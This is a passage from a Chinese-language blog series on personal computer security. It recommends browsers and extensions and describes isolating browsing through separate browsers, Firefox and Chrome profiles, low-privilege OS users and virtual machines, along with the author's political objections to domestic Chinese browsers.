<p>　　至于 IE，曾经是市场份额最大的浏览器，而是集成（捆绑）在 Windows 系统中。为啥俺把它放到第二类捏？有如下几个原因：<br>\1. IE 跟 Windows 集成得太紧密。IE 如果爆漏洞，通常要等微软发布 Windows 补丁来修复。而 Windows 补丁是按月发布的——太不及时啦。<br>\2. 相比 Firefox 和 Chrome，IE 是闭源项目。由于源代码不公开，而且参与的人不够多，导致潜在的漏洞难以被发现。<br>\3. IE 用户大都是菜鸟用户（很多菜鸟只知道用系统内置的浏览器）。由于菜鸟不太懂安全防范，有些【低级】骇客就喜欢盯着这个用户群。</p>
<p>　　说到这儿，可能有同学会问：天朝的好多网银都只能用 IE（很多网银客户端依赖于 IE 的 ActiveX 控件），咋办捏？别担心，在本系列的下一篇《Web相关的防范 (下)》会谈到此问题的解决方法。</p>
<h3 id="◇第三类：五花八门的【国产】浏览器"><a href="#◇第三类：五花八门的【国产】浏览器" class="headerlink" title="◇第三类：五花八门的【国产】浏览器"></a>◇第三类：五花八门的【国产】浏览器</h3><p>　　说到【国产】的浏览器，有必要谈一下浏览器的内核（也就是浏览器的引擎）。绝大部分国产的浏览器，都不是自己开发内核，而是基于老外现成的内核。常见的浏览器内核有三款，分别是：<br>Gecko 内核（来自于 Mozilla 开源组织，主要供 Firefox 使用）<br>Trident 内核（来自于微软，主要供 IE 使用）<br>WebKit 内核（独立的开源项目，Chrome 和 Safari 使用此内核）<br>　　几款常见的国产浏览器（360浏览器、傲游浏览器、QQ 浏览器），使用的是 Webkit + Trident 的双内核模式。<br>　　某些国产浏览器把双内核作为吹嘘的亮点。但在安全层面，双内核反而会带来安全问题。假如你手头的国产浏览器采用了 Webkit + Trident 双内核。只要这两款内核中，有一个爆出安全漏洞，你就有可能中招。也就是说：双内核会增加你中招的概率。<br>　　俺极力反对【国产】浏览器，还有另一个原因——政治层面的安全问题。朝廷为了监控屁民在互联网上的一言一行，会跟国产浏览器厂商合作，通过浏览器记录网民的行踪。</p>
<p>　　举例：<br>　　前几年腾讯搞的“TT浏览器”，会把用户上网行踪记录在某个文件中。<br>　　至于 360，名声更是臭不可闻。360 浏览器本身就存在收集用户隐私的问题，居然还好意思自称是“安全浏览器”。而且大伙儿别忘了，奇虎公司跟 GFW 一直保持着暧昧的关系哦。</p>
<p>　　综上所述，俺个人【非常反对】使用国产浏览器。</p>
<h2 id="★如何选择插件和扩展？"><a href="#★如何选择插件和扩展？" class="headerlink" title="★如何选择插件和扩展？"></a>★如何选择插件和扩展？</h2><p>　　说完浏览器的选择，再来聊聊如何选择插件和扩展。</p>
<h3 id="◇插件和扩展的【区别】"><a href="#◇插件和扩展的【区别】" class="headerlink" title="◇插件和扩展的【区别】"></a>◇插件和扩展的【区别】</h3><p>　　先来扫盲一下插件和扩展的区别（连很多 IT 技术人员都把这两者混为一谈）。所谓的插件，洋文叫“plugin”；所谓的扩展，洋文叫“extension”。两者的区别如下：</p>
<p><strong>插件</strong><br>　　在功能上，插件通常是用来渲染 HTML 页面中的 <code>&lt;object&gt;</code> 或 <code>&lt;embed&gt;</code> 标签。<br>　　插件通常实现比较【底层】的功能，通常以平台相关的代码（本地代码）编写，可以调用操作系统的 API。形式上，插件以动态库（Windows 上就是 DLL 文件）的方式，加载到浏览器的进程内。由于使用本地代码编写，插件通常依赖于特定的操作系统（不同系统的插件不能混用）。</p>
<p>举例：<br>Flash 插件<br>媒体播放器插件<br>PDF 插件<br>Java 插件</p>
<p><strong>扩展</strong><br>　　扩展，顾名思义，是用来扩展浏览器自身的功能。所以，扩展可以调用浏览器自身的 API，但是大部分扩展【不能】调用操作系统的 API。<br>　　一般来说，扩展是跟操作系统无关的。比如 Firefox 的大部分扩展，既可以用于 Windows 平台的 Firefox，也可以用于 Linux 和 Mac 的 Firefox。</p>
<h3 id="◇插件和扩展在安全方面的差异"><a href="#◇插件和扩展在安全方面的差异" class="headerlink" title="◇插件和扩展在安全方面的差异"></a>◇插件和扩展在安全方面的差异</h3><p>　　由于插件比较底层，一旦出现高危漏洞（比如能够执行本地代码的漏洞），攻击者就可以在操作系统中植入木马。可以这么说，插件出现漏洞，其危险性类似于浏览器出现漏洞。<br>　　相对而言，扩展出现漏洞，其危险性往往不如插件严重，通常也不会导致攻击者植入木马。</p>
<h3 id="◇尽量使用口碑好的扩展"><a href="#◇尽量使用口碑好的扩展" class="headerlink" title="◇尽量使用口碑好的扩展"></a>◇尽量使用口碑好的扩展</h3><p>　　虽然扩展出漏洞导致的危险性不如插件那么高，但也不能掉以轻心。<br>　　俺的经验是：尽量使用知名度高且评价好的扩展。这样的扩展通常成熟度也比较高——即使出了漏洞，更新也比较及时；这类扩展也会有更多安全研究人员对其进行研——即使有漏洞，也更容易被发现。<br>　　反之，对于某些很少人用的扩展，最好敬而远之。顺便提一下。某些层次低的入侵者，甚至会把木马伪装成浏览器扩展，再忽悠一个很花哨的功能，然后放到网上给大伙儿用。</p>
<h3 id="◇尽量避免使用【插件】"><a href="#◇尽量避免使用【插件】" class="headerlink" title="◇尽量避免使用【插件】"></a>◇尽量避免使用【插件】</h3><p>　　从上述对比可知，插件如果出现漏洞，危险性很高。所以，俺的建议是：<strong>尽量避免使用【插件】</strong>。<br>　　不过捏，避免使用插件，说起来简单，但是做起来有点难度。其它插件，说不用就不用了。但是 Flash 插件，实在是用得太广泛了（视频网站用到它，网页休闲小游戏也用到它），估计大伙儿难以割舍啊。<br>　　不幸的是，Flash 插件又最危险。一方面是因为 Adobe 的程序猿，安全意识太差；另一方面是因为 Flash 是用得最多的插件，成为攻击者的重点研究对象。根据2011年的统计数字，去年一年，光是【<strong>高危漏洞</strong>】，Flash 就爆了4次——当之无愧地坐上漏洞排行榜的头把交椅。<br>　　面对 Flash 插件，该咋办捏？列位看官，请听下回分解。（下一篇会尽快发布）</p>
<h1 id="如何防止黑客入侵-6-：Web相关的防范（中）"><a href="#如何防止黑客入侵-6-：Web相关的防范（中）" class="headerlink" title="如何防止黑客入侵[6]：Web相关的防范（中）"></a>如何防止黑客入侵[6]：Web相关的防范（中）</h1><p><strong>文章目录</strong></p>
<p>★如何防范浏览器和插件的漏洞？<br>★“多浏览器”的方案<br>★【多实例】的方案<br>★【多用户】的方案</p>
<p>　　在本系列的前文聊了些基础性的东西，包括：常见的攻击手法、如何选择浏览器和插件。今天，俺继续介绍几个相对高级一点的话题。</p>
<h2 id="★如何防范浏览器和插件的漏洞？"><a href="#★如何防范浏览器和插件的漏洞？" class="headerlink" title="★如何防范浏览器和插件的漏洞？"></a>★如何防范浏览器和插件的漏洞？</h2><p>　　在前一篇已经告诉大伙儿“如何选择浏览器”。但是光知道这个是不够滴！因为浏览器也是软件，只要是软件就可能会出现漏洞（包括安全漏洞）。<br>　　即使你按照俺的建议，选择 Firefox 或 Chrome 作为日常的浏览器，也【无法完全避免】浏览器自身出漏洞的问题。而且浏览器的漏洞中，有一些是没有补丁的高危漏洞（包括“未公开漏洞”＆“零日漏洞”，俺在前文里介绍过）。因为没有补丁，所以这类高危漏洞就特别危险。这就引出了第一个问题：<strong>如何防范浏览器的漏洞？</strong><br>　　另外，在浏览器插件中，Flash 插件既是最危险的插件，也是使用最广的插件。这就引出了第二个问题：<strong>如何安全地使用危险的插件？</strong><br>　　要解决上述2个问题，可以使用同一个原则，那就是：【<strong>对浏览器进行隔离</strong>】。具体的隔离方式有很多种，今天俺由浅入深，分别介绍一下。</p>
<h2 id="★“多浏览器”的方案"><a href="#★“多浏览器”的方案" class="headerlink" title="★“多浏览器”的方案"></a>★“多浏览器”的方案</h2><h3 id="◇操作步骤"><a href="#◇操作步骤" class="headerlink" title="◇操作步骤"></a>◇操作步骤</h3><p>　　这招是最简单的——就是在一台电脑上安装多款【不同内核】的浏览器。具体步骤俺就不多说了，节约点口水。</p>
<h3 id="◇优点"><a href="#◇优点" class="headerlink" title="◇优点"></a>◇优点</h3><p><strong>1. 解决网银的问题</strong><br>　　前面提到了国内网银依赖于 IE 的问题。但是 IE 的安全性又不如 Firefox 和 Chrome，咋办捏？最简单的办法就是同时安装两款浏览器（比如 IE + Firefox）。平时你上网的时候，用 Firefox，需要用网银，则改用 IE。<br>　　由于你仅仅在使用网银的时候，才开启 IE，大大降低了 IE 被入侵的机会。</p>
<p><strong>2. 解决跨站脚本（XSS）的问题</strong><br>　　使用多种浏览器，还可以帮你解决跨站脚本攻击的问题。<br>　　单纯的XSS攻击，主要是依赖 JavaScript。而 JavaScript 只能在浏览器进程内起作用，无法跨浏览器进程。所以，如果你同时使用 A B 两款浏览器。如果 A 浏览器发送 XSS 攻击，通常不会影响到 B 浏览器。除非这个 XSS 攻击结合了浏览器漏洞或插件漏洞。那么，多款浏览器是否能防范浏览器漏洞和插件漏洞捏？请看往下看。</p>
<p><strong>3. 部分解决高危插件（Flash）的使用问题</strong><br>　　俺在<a target="_blank" rel="noopener" href="https://program-think.blogspot.com/2012/08/howto-prevent-hacker-attack-5.html">上一篇</a>提到了利用 Flash 入侵 Gmail 的案例。<br>　　比方说，你同时用 Firefox 和 Chrome。其中 Firefox 安装 Flash，用来上普通的网站；而 Chrome 不装或禁用 Flash，专门用来上 Google 的相关服务器（比如 Gmail）。<br>　　某天，你收到一封恶意的邮件，该邮件会利用 Flash 的漏洞来入侵用户的电脑。幸运的是，你用来访问 Gmail 的 Chrome 上没有 Flash 插件（被禁用），于是攻击者的阴谋没有得逞 :-)</p>
<h3 id="◇缺点"><a href="#◇缺点" class="headerlink" title="◇缺点"></a>◇缺点</h3><p><strong>1. 无法彻底解决浏览器漏洞和插件漏洞的问题</strong><br>　　细心的读者会注意到，刚才那个小节的标题是部分解决高危插件（Flash）的问题。为啥俺要特地强调【部分解决】捏？因为浏览器的漏洞和插件的漏洞有很多种。有些漏洞只是让浏览器崩溃，无伤大雅；而有些漏洞可以导致在本地执行代码，并且能进一步植入木马。一旦你碰到后者，即使你采用“多种浏览器”的方式，也抵挡不住。<br>　　某些天真的网友可能会问：浏览器厂商和插件厂商不是会升级补丁吗？但是问题在于，有少数一些漏洞是没有补丁的。为啥会这样捏？请看本系列上一篇《安全漏洞的基本防范》，里面介绍了”未公开漏洞”和”零日漏洞”。<br>　　不过别担心，俺后面还会介绍更高级的招数，来防范这种情况。</p>
<p><strong>2. 灵活性不够</strong><br>　　对于“多浏览器”的方案，还有一个缺点是不够灵活。<br>　　因为你要为每一种用途安装一款浏览器，如果你的用途比较多（比如：上网银、普通浏览、Web 邮箱、看视频），就要装好几款。<br>　　另外，有些用户就喜欢某一款浏览器，你让这些用户装好几款浏览器，他们会觉得不爽。<br>　　对于“灵活性不够”的缺点，大伙儿可以参考接下来要介绍的第二招——“多实例”的方案。</p>
<h2 id="★【多实例】的方案"><a href="#★【多实例】的方案" class="headerlink" title="★【多实例】的方案"></a>★【多实例】的方案</h2><h3 id="◇什么是浏览器的多实例？"><a href="#◇什么是浏览器的多实例？" class="headerlink" title="◇什么是浏览器的多实例？"></a>◇什么是浏览器的多实例？</h3><p>　　所谓的浏览器多实例，有时候也称之为“Multiple Profiles”。<br>　　不论是 Firefox 还是 Chrome，默认安装的时候，只有一个实例（Profile）。和浏览器相关的各种信息，包括：插件、扩展、外观（皮肤）、页面缓存、cookie、等等，都存储在这个实例中。<br>　　反之，如果使用多实例，每个实例都具有独立的插件、独立的扩展、独立的外观（皮肤）、独立的页面缓存、独立的 cookie、等等。不同实例之间是相对隔离的，【不会】互相影响。<br>　　对于 Chrome，再特别提醒一下：<br>　　Chrome 同时支持“Multiple Profiles”与“Multiple Accounts”。但别把这两者搞混了。即使你配置了多个 Accounts，依然在【同一个】实例里。</p>
<h3 id="◇操作步骤-1"><a href="#◇操作步骤-1" class="headerlink" title="◇操作步骤"></a>◇操作步骤</h3><p>　　多实例的配置，很多人不晓得。所以俺详细说一下。考虑到 Windows 用户居多，俺以 Windows 举例。Linux 和 Mac OS 的操作步骤大同小异。</p>
<p><strong>多实例的 Firefox</strong></p>
<p>　　对于 Windows 上的 Firefox，Profile 都放置于 <code>%APPDATA%\Mozilla\Firefox\Profiles</code> 目录下。<br>　　假设你想创建一个【全新的】Firefox 实例，可以通过如下命令行来启动 Firefox。</p>
<figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs basic"><span class="hljs-string">&quot;&#123;PATH&#125;\firefox.exe&quot;</span> -P <span class="hljs-string">&quot;XXXX&quot;</span> -no-<span class="hljs-comment">remote</span><br></code></pre></td></tr></table></figure>
<p>　　上述命令中，<code>&#123;PATH&#125;</code> 表示你的 Firefox 的【安装目录】。<code>XXXX</code> 表示你要创建的【实例名】（实例名可以是任意字母组合，你也可以把 <code>XXXX</code> 改成其它名称）。<br>　　运行完上述命令，Firefox 会启动出一个名叫 <code>XXXX</code> 的实例。与此同时，在 <code>%APPDATA%\Mozilla\Firefox\Profiles</code> 下会多出一个名叫 <code>XXXX</code> 的目录。<br>　　按照上述方式依样画葫芦，你就可以启动出任意多个 Firefox 实例。为了省事，你可以把上述命令行做成一个快捷方式，放到桌面上，免得每次都敲键盘。<br>　　另外，Firefox 还提供了一个多实例的管理界面，用如下命令可以调出该界面。</p>
<figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c"><span class="hljs-string">&quot;&#123;PATH&#125;\firefox.exe&quot;</span> -p<br></code></pre></td></tr></table></figure>

<p><strong>多实例的 Chrome</strong></p>
<p>　　Chrome 类似于 Firefox，也可以通过命令行启动新的实例。<br>　　对于 Windows 上的 Chrome，由于 Chrome 安装的时候没让选安装目录，所以其【<strong>exe 的安装目录固定如下</strong>】：</p>
<p>Windows 7 或 Vista 系统<br><code>C:\Users\**&#123;USER&#125;**\AppData\Local\Google\Chrome\Application\chrome.exe</code><br>Windows XP 系统<br><code>C:\Documents and Settings\**&#123;USER&#125;**\Local Settings\Application Data\Google\Chrome\Application\chrome.exe</code><br>　　上述的 <code>&#123;USER&#125;</code> 表示你的 Windows 用户名</p>
<p>　　找到 <code>chrome.exe</code> 之后，接下来，你需要创建一个目录，用来存放新创建的实例。比方说，你用的是这个目录： <code>X:\XXXX\</code><br>　　然后，通过如下命令启动 Chrome，就可以创建出新实例</p>
<p>Vista 或 Windows 7 系统</p>
<figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">C:<span class="hljs-symbol">\U</span>sers<span class="hljs-symbol">\&#123;</span>USER&#125;<span class="hljs-symbol">\A</span>ppData<span class="hljs-symbol">\L</span>ocal<span class="hljs-symbol">\G</span>oogle<span class="hljs-symbol">\C</span>hrome<span class="hljs-symbol">\A</span>pplication<span class="hljs-symbol">\c</span>hrome.exe --user-data-dir=&quot;X:<span class="hljs-symbol">\X</span>XXX<span class="hljs-symbol">\&quot;</span><br></code></pre></td></tr></table></figure>
<p>Windows XP 或 Win 2003 系统</p>
<figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">C:<span class="hljs-symbol">\D</span>ocuments and Settings<span class="hljs-symbol">\&#123;</span>USER&#125;<span class="hljs-symbol">\L</span>ocal Settings<span class="hljs-symbol">\A</span>pplication Data<span class="hljs-symbol">\G</span>oogle<span class="hljs-symbol">\C</span>hrome<span class="hljs-symbol">\c</span>hrome.exe --user-data-dir=&quot;X:<span class="hljs-symbol">\X</span>XXX<span class="hljs-symbol">\&quot;</span><br></code></pre></td></tr></table></figure>

<p>　　按照上述方式依样画葫芦，你就可以创建出任意多个 Chrome 实例。为了省事，你可以把上述命令行做成一个快捷方式，放到桌面上，免得每次都敲键盘。</p>
<h3 id="◇优点-1"><a href="#◇优点-1" class="headerlink" title="◇优点"></a>◇优点</h3><p><strong>1. 解决跨站脚本（XSS）的问题</strong><br>　　这个优点跟“多浏览器”方案是类似的。俺就不再啰嗦了。</p>
<p><strong>2. 部分解决高危插件（Flash）的使用问题</strong><br>　　这个优点跟“多浏览器”方案是类似的。俺就不再啰嗦了。</p>
<p><strong>3. 灵活性高</strong><br>　　与“多浏览器”的方案相比，“多实例”的方案明显灵活多了。因为 Firefox 和 Chrome 可以创建出任意多个实例（只要你的硬盘够大，想建几个实例都行）。而且，这个方案可以满足某些 Firefox 粉丝或 Chrome 粉丝的个人偏好。</p>
<h3 id="◇缺点-1"><a href="#◇缺点-1" class="headerlink" title="◇缺点"></a>◇缺点</h3><p><strong>1. 无法彻底解决浏览器漏洞的问题</strong><br>　　在这方面，“多实例方案”与“多浏览器方案”具有共同的缺陷——无法抵御具有【本地代码执行】的高危漏洞。包括浏览器漏洞和插件漏洞都有可能出现这类高危漏洞。<br>　　那么，该咋办捏，请看下一节——“多用户”的方案。</p>
<h2 id="★【多用户】的方案"><a href="#★【多用户】的方案" class="headerlink" title="★【多用户】的方案"></a>★【多用户】的方案</h2><p>　　前面提到的两种方案，都无法防范某些浏览器或插件的高危漏洞。因为这些高危漏洞会导致在本地执行攻击代码，并有可能植入木马。现在，俺来介绍第三种方案——多用户方案。此方案可以防范<strong>大部分</strong>在本地执行的攻击代码。<br>　　先说明一下，此处的“用户”指的是【操作系统用户】。</p>
<h3 id="◇某些高危漏洞为啥很危险？"><a href="#◇某些高危漏洞为啥很危险？" class="headerlink" title="◇某些高危漏洞为啥很危险？"></a>◇某些高危漏洞为啥很危险？</h3><p>　　俺前面反复提到“导致本地执行攻击代码的漏洞”。这样的漏洞是非常非常危险的。为啥捏？俺简单扫盲一下。<br>　　如果你的浏览器或者浏览器插件具有这类漏洞，当你访问某个恶意网页时，如果该恶意网页能够利用此漏洞，就可以在你的本地的操作系统中执行攻击代码。由于这个攻击代码是在浏览器的进程内触发的，所以该攻击代码就具有当前用户所具有的权限。<br>　　比方说，如今大部分网友都用 Windows 上网。并且，这些网友都是以“系统管理员”的身份使用浏览器。一旦碰到这类漏洞时，本地的攻击代码也同时具有了“系统管理员权限”。有了这么高的权限，攻击代码可以为所欲为。<br>　　某些网友可能会问：那不用管理员身份上网，是不是就没事了？<br>　　俺只能说，用低权限的用户身份（比如 Windows 里面的“Users 组”）上网，相对于用管理员身份上网，会好一些。但是捏，还是有问题。<br>　　举个例子：<br>　　即使你用低权限用户上网，一旦遭遇这类漏洞，攻击代码还是有可能植入木马。然后捏，这个木马有可能会查找你电脑上的各种私密文件（比如你的裸照）。然后木马会把这些私密文件发送给木马的主人。</p>
<p>　　从上述例子可见，用低权限的用户上网，【不能】彻底解决问题。所以，俺隆重推出第三种方案——多用户方案。</p>
<h3 id="◇啥是“多用户方案”捏？"><a href="#◇啥是“多用户方案”捏？" class="headerlink" title="◇啥是“多用户方案”捏？"></a>◇啥是“多用户方案”捏？</h3><p>　　如今的桌面操作系统，无论是 Windows 还是 Linux 或 Mac OS，都可以创建多个操作系统用户，并且这多个用户可以同时运行程序。如果你用过 WinXP 的快速用户切换，应该对此深有体会。<br>　　多用户方案的关键在于：<br>　　你需要创建一个或多个【低权限】的“上网用户”（所谓低权限，必须低于你当前使用的用户权限）。这些“上网用户”专门用来访问各种网站。<br>　　假使你不幸访问了恶意网页，遭遇本地执行的攻击代码，问题也不大。因为这些上网用户的权限很低，所以它们触发的攻击代码，权限也很低。因此攻击代码就比较难钻空子。一般来说，对“上网用户”的权限限制得越严格，攻击代码就越难有作为。</p>
<h3 id="◇操作步骤-2"><a href="#◇操作步骤-2" class="headerlink" title="◇操作步骤"></a>◇操作步骤</h3><p><strong>1. 创建上网用户</strong><br>　　如何在桌面系统中创建新的用户，大家应该都会吧？不会的同学，请看《避免使用高权限用户》一文的相关章节。上网用户可以只创建一个，也可以创建多个。具体建几个，看你的需求。<br>　　举例：<br>　　假如你非常看重网银的安全，可以创建两个上网用户，一个专门用来访问网银，一个专门用来上其它网站。<br>　　提醒一下：在这些上网用户的环境中，除了浏览器，其它啥软件都【别】装。</p>
<p><strong>2. 设置上网用户的权限</strong><br>　　再啰嗦一次，上网用户的权限，一定要低于你目前使用的用户权限。<br>　　以 Windows 为例：<br>在 Windows 中，常见的用户组的权限大小分别是：<strong>“Administrators 组” ＞ “Power Users 组” ＞ “Users 组” ＞ “Guest 组”</strong>。<br>如果你平时用“Administrators 组”的用户，那么可以把上网用户设置为：“Power User”或“User”或“Guest”<br>如果你平时用“Power Users 组”的用户，那么上网用户就只能设置为 User 或 Guest。<br>以此类推……<br>（如果你想了解这些用户组之间的权限差异，可以参考本系列的第一个帖子《避免使用高权限用户》）</p>
<p>　　提醒一下：<br>　　Guest 用户组的权限是最低，低得难以想象。所以，从安全角度而言，把上网用户设置为“Guest 组”是最安全滴。但是，也是最麻烦滴。你需要进行好多设置——否则的话，你可能连浏览器都跑不起来。<br>　　所以，除非你对 Windows 系统比较熟悉，否则的话，俺【不】建议使用“Guest 组”的权限。比较理想的权限是“Users 组”。这个组的权限也比较低，但是用起来不麻烦。</p>
<p><strong>3. 设置文件目录的访问控制权限（ACL）</strong><br>　　每个人的电脑中，都会有某几个目录是用来存放你的敏感个人资料的。<br>　　你必须设置这些目录的访问控制权限（简称 ACL），设置为：“上网用户”所在的组【<strong>不允许读写</strong>】。这样一来，你可以把自己那些敏感的，私密的文件（比如自己的裸照），都通过上述 ACL 保护起来。即使“上网用户”遭遇高危漏洞的攻击，本地执行的攻击代码也【难以拿到】你的隐私（俺说”难以拿到”，意思就是说，还是有可能滴，但是可能性很小，后面会解释）。<br>　　顺便提醒一下：对于 Windows 系统，只有使用 NTFS 格式的分区，才支持 ACL。FAT32 格式的分区是不支持滴！<br>　　如果你是个菜鸟，不懂得如何设置文件及目录的 ACL，没关系！Google 一下，你就知道。</p>
<p><strong>4. 多用户浏览器共享同一个桌面的技巧</strong><br>　　你可以直接用 Windows 提供的“快速用户切换”。对于 Windows 系统，从 WinXP 开始就提供了”快速用户切换”的功能。用它来切换用户还是很方便滴。但是这招有一个缺点：你一次只能看到某一个用户运行的软件，其它用户运行的软件看不到。<br>　　不过没关系，还有一个小技巧，可以让你在同一个桌面中，运行不同用户的软件（包括浏览器）。<br>　　假设你创建了 A ＆ B 两个用户。其中 A 是主用户，用来完成你日常的工作；B 是上网用户。那么你可以先登录“A用户”，然后在“A用户”的桌面上创建一个浏览器的快捷方式。（如何创建快捷方式，就不用俺手把手教了吧）<br>　　用鼠标选中该快捷方式，在快捷菜单（右键菜单）中，选择“属性”菜单项。出现如下对话框。</p>
<p><img src="https://lh4.googleusercontent.com/G7iCvdIjvzNzNLP-G0vIx1TUWoquHyB1250xkyEHN-yWMR1pDiCx_BBF8hPyXLCaRyp_3fuz0tXVVxNm5cb4dQpGezCDaS0_cl4LZV6wwGnw5icjZK81l3bmdmVv" alt="不见图 请翻墙"></p>
<p>在该对话框中，点“高级”按钮。出现如下对话框。把“以其他用户身份运行”选项打勾，就可以啦。</p>
<p><img src="https://lh3.googleusercontent.com/X47byUOJ2PtD7Smq9ArZdUFPjBjrCgrkY9lYSdWnTB7RIHUq1ByRDxtDL9v09Nk5eACHC4RzZDcV0RT9-adVQ77RxwGOqACe0YPpC_UgOEsSX4bp85kbWWlKwFJn" alt="不见图 请翻墙"></p>
<p>之后，如果你想在“A用户”的桌面上运行“B用户”的浏览器，只需点击该快捷方式，就会弹出如下对话框。然后输入“B用户”的用户名/口令，就能以“B用户”的身份运行浏览器。</p>
<p><img src="https://lh5.googleusercontent.com/vULI8x0WJ0XStJdYnN3G-t4Dj_Pr0YTzB-vyOVnANH04M2I6UXVOs49EJDwBS0Ba6Rq9pc0-JcekxJvrIrWh7mr2CzTGnVMr6LFAsQFlLf7w479G9PLEQWSW3-Ia" alt="不见图 请翻墙"></p>
<p>　　刚才介绍的是图形界面的配置。对于习惯于命令行的 IT 专业人员，还可以用命令行的方式启动指定用户的某个进程。Linux 系统和 Mac OS 系统有 <code>su</code> 或 <code>sudo</code> 命令；Windows 系统有 <code>runas</code> 命令。</p>
<h3 id="◇优点-2"><a href="#◇优点-2" class="headerlink" title="◇优点"></a>◇优点</h3><p><strong>1. 解决跨站脚本（XSS）的问题</strong><br>　　这个优点跟前两种方案类似，俺就不再啰嗦了。</p>
<p><strong>2. 解决高危插件（Flash）的使用问题</strong><br>　　这个优点跟前两种方案类似，俺就不再啰嗦了。</p>
<p><strong>3. 防范各种浏览器漏洞</strong><br>　　正如刚才提到的——前两种方案（多浏览器、多实例）无法防御浏览器及插件的某些高危漏洞（具备本地执行攻击代码的漏洞）。而“多用户方案”可以大大降低这类漏洞的危害性。使得攻击代码只能威胁到“上网用户”本身，而不会威胁到其它操作系统用户。</p>
<h3 id="◇缺点-2"><a href="#◇缺点-2" class="headerlink" title="◇缺点"></a>◇缺点</h3><p><strong>1. 初始配置稍嫌麻烦</strong><br>　　相比前面两种方案，这个方案的【初始配置】比较麻烦。而且你要分清楚哪个用户是用来干啥的。不过捏，一旦用久了，习惯了，也就不觉得麻烦了。</p>
<p><strong>2. 无法防范极个别高明的攻击者</strong><br>　　“多用户方案”之所以可以隔离攻击代码，是因为如今所有主流的桌面操作系统，都能够在操作系统层面，对不同的系统用户进行隔离。因为有操作系统层面的隔离，所以才限制了攻击代码的危害性。<br>　　但是，操作系统层面的隔离，也不是百分之百可靠滴。不要忘了，操作系统本身也是软件，也可能出现安全漏洞。在操作系统的安全漏洞中，有一类漏洞叫做“权限提升漏洞”（简称“提权漏洞”）。所谓的“提权漏洞”，顾名思义，就是能够提升【当前执行代码】的权限。比方说，本来攻击代码没有管理员权限，通过”提权漏洞”，就可以拿到管理员权限。<br>　　如果你的操作系统本身存在“提权漏洞”，同时你的浏览器或者插件存在“能够在本地执行代码的漏洞”，那么，高明的攻击者就有可能把这两者组合起来，对你的系统进行组合攻击。<br>　　不过大伙儿别担心——要实现这类组合攻击，需要同时掌握【未公开的】浏览器或插件漏洞，并且还要有【未公开的】操作系统提权漏洞（俺在前文里介绍过，“未公开漏洞”总是比“零日漏洞”更危险）。另外，攻击者还需要做很多准备工作，才能诱使你访问到恶意网页。一般的入侵者根本没有这个本事，也没有耐心去搞这些。反之，有这个本事又有这个耐心的入侵者，通常不会拿这种招数去入侵普通网友（这么做简直是大材小用）。所以，如果你只是一个普通的网友，在前面三个方案中挑选一个，即可。</p>
<p>　　估计有些好奇的同学会打听了。什么样的入侵者具有这种实力？什么样的人会成为他们的目标？<br>　　由于本文的篇幅已经很长了，俺稍微调一下列位看官的胃口，在《Web相关的防范（下）》再来八卦这些，同时也介绍一下比“多用户方案”更高级的方案。虽然这种方案很多人用不到，但俺还是会写出来，就当满足一下大伙儿的好奇心 :-)</p>
<h1 id="如何防止黑客入侵-7-：Web相关的防范（下）"><a href="#如何防止黑客入侵-7-：Web相关的防范（下）" class="headerlink" title="如何防止黑客入侵[7]：Web相关的防范（下）"></a>如何防止黑客入侵[7]：Web相关的防范（下）</h1><p><strong>文章目录</strong></p>
<p>★【多虚拟机】的方案<br>★使用浏览器的【安全扩展】<br>★结尾</p>
<p>　　在前文，俺介绍了三种隔离浏览器的方式（多种浏览器、同种浏览器多实例、多操作系统用户）。今天继续介绍第四种隔离方式——虚拟机，然后再推荐一些浏览器的安全扩展。</p>
<h2 id="★【多虚拟机】的方案"><a href="#★【多虚拟机】的方案" class="headerlink" title="★【多虚拟机】的方案"></a>★【多虚拟机】的方案</h2><h3 id="◇什么是“虚拟机”？"><a href="#◇什么是“虚拟机”？" class="headerlink" title="◇什么是“虚拟机”？"></a>◇什么是“虚拟机”？</h3><p>　　本文提到的“虚拟机”，全称是“操作系统虚拟机”。<br>　　最近10年来，硬件水平显著提升，操作系统虚拟化的技术开始普及，出现了若干针对操作系统的虚拟化软件。这种软件可以让你在一台电脑上，同时运行【<strong>多个操作系统</strong>】（是不是很有趣？）。通过虚拟化软件来运行的操作系统，称之为“虚拟操作系统”；与之对应，你原先的操作系统称之为：真实操作系统或宿主操作系统。<br>　　由于“虚拟操作系统”是虚拟出来滴，你可以在里面为所欲为，而【不会】对真实操作系统产生实质性的影响。比方说，你可以在虚拟系统中把硬盘格式化，但不会影响到你的真实系统。同样的，如果某个虚拟系统被病毒感染了，也不会影响真实系统和其它虚拟系统。</p>
<h3 id="◇什么是“多虚拟机”的方案？"><a href="#◇什么是“多虚拟机”的方案？" class="headerlink" title="◇什么是“多虚拟机”的方案？"></a>◇什么是“多虚拟机”的方案？</h3><p>　　所谓“多虚拟机”的方案，就是在你的电脑上创建多个虚拟机，分别用来实现【不同安全级别】的上网行为。<br>　　举个例子：<br>　　你可以创建虚拟机A，只用来访问网银（不访问其它网站）；然后创建虚拟机B，用来进行其它上网行为。那么，即使你在虚拟机B受到攻击，对虚拟机A也完全没有影响。这样一来，就可以彻底保证网银的安全。</p>
<h3 id="◇为啥要用“多虚拟机”的方案？"><a href="#◇为啥要用“多虚拟机”的方案？" class="headerlink" title="◇为啥要用“多虚拟机”的方案？"></a>◇为啥要用“多虚拟机”的方案？</h3><p>前一篇博文提到的三种隔离方案，“多用户”比前两种方案安全。这种方案是基于操作系统提供的用户壁垒——包括：不同用户的进程隔离性、文件系统的访问控制（ACL）、等等。<br>　　但是“多用户”方案还是有缺陷的。如果攻击者同时利用了未公开的浏览器漏洞和未公开的操作系统【提权】漏洞，就有可能攻破操作系统的用户壁垒。不过大伙儿别担心，实现这种攻击的难度比较大，只有足够牛B的入侵者能够做到这点。<br>　　为了满足列位看官的好奇心，稍微介绍一下所谓的牛逼黑客，大都是哪些人。</p>
